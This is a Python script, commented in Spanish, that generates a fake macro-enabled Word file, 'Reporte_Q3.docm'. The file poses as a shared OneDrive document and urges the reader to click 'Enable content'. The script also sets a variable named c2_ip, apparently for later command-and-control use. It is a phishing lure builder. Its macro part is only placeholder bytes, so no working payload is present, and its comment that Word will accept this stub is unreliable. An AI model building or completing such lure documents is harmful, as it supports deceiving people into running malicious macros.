import zipfile
import os

# Crear un .docm (Word con macro) falso
# Es un ZIP con estructura Office Open XML

c2_ip = os.popen("hostname -I | awk '{print $1}'").read().strip()

# [Content_Types].xml
content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
<Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>
<Override PartName="/word/vbaData.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.vbaData+xml"/>
</Types>'''

# _rels/.rels
rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>'''

# word/_rels/document.xml.rels
doc_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/vbaProject" Target="vbaProject.bin"/>
</Relationships>'''

# word/document.xml
document = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body>
<w:p><w:r><w:t>Documento compartido - OneDrive</w:t></w:r></w:p>
<w:p><w:r><w:t>Haga clic en "Habilitar contenido" para ver el documento.</w:t></w:r></w:p>
</w:body>
</w:document>'''

# word/vbaData.xml
vba_data = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:docVars xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
</w:docVars>'''

# word/vbaProject.bin - archivo binario mínimo con macro VBA
# Vamos a crear un .bin básico que Word acepte
vba_project = b'Microsoft Visual Basic for Applications\x00' + b'\x00' * 100

with zipfile.ZipFile('Reporte_Q3.docm', 'w') as z:
    z.writestr('[Content_Types].xml', content_types)
    z.writestr('_rels/.rels', rels)
    z.writestr('word/_rels/document.xml.rels', doc_rels)
    z.writestr('word/document.xml', document)
    z.writestr('word/vbaData.xml', vba_data)
    z.writestr('word/vbaProject.bin', vba_project)

print("[+] Reporte_Q3.docm creado (plantilla basica)")
